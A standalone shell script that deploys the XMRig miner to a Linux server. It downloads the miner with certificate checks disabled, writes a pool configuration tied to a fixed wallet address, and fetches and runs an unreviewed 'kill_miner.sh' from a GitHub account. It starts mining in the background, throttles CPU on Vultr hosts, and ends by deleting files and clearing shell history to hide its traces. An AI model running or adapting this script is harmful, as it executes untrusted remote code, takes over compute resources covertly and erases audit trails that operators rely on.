#!/bin/sh
#read -p "What is Worker? (exp: vps01): " worker
IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '-'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
rm -fv danielchau.sh
sudo apt-get update -y
sudo apt-get install cpulimit -y
sudo apt-get install bc jq -y
wget --no-check-certificate -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
tar -xvf xmrig.tar.gz
chmod +x ./xmrig-6.21.0/* 
mv /root/xmrig-6.21.0/* /root/
cores=$(nproc --all)
country=$(curl -s ipinfo.io | jq -r '.country')
limitCPU=$((cores * 80))

#find best servers
servers=("stratum-eu.rplant.xyz" "stratum-asia.rplant.xyz" "stratum-na.rplant.xyz")
fastest_server="stratum-eu.rplant.xyz"
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"

cat /dev/null > /root/config.json
cat >>/root/config.json <<EOF
{
    "pools": [
        {
            "algo": "ghostrider",
            "url": "$fastest_server:17054",
            "user": "RpmKEqqfCkrGMgHs8GiNkka7wmHp1o9StM.$IP4_UNDERSCORE-$country"
        }  
    ]
}
EOF
cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
./kill_miner.sh
sleep 3
sudo /root/xmrig --donate-level 1 --threads=$cores --background -c config.json
sleep 3
EOF
chmod +x /root/danielluis1921.sh

hostname=$(hostname)
if [ "$hostname" = "vultr" ];
then
  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielluis1921.sh
  sed -i 's/Li/Vu/g' config.json
else
  echo "hostname isn't vultr"
fi

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielluis1921.sh
sleep 20
rm -fv *
rm -fR cpuminer-opt-linux/
rm -fR xmrig-6.21.0/
history -c && history -w
